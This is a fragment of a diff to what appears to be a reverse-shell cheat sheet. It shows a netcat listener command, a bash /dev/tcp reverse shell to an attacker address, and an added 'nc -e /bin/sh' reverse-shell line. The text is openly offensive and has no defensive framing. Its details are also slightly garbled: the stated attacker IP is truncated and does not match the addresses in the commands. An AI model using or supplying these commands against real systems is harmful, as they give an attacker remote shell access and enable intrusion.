@@ -2,6 +2,7 @@ The following examples assumes the hacker IP is 10.20.14 and use port 8080 for t
 Therefore in all f these cases you need to listen for port 8080 using the following command
 nc -vv -l -p 8080
 
+nc -e /bin/sh 192.168.1.115 8080 (reverse shell)
 
 BASH
 bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
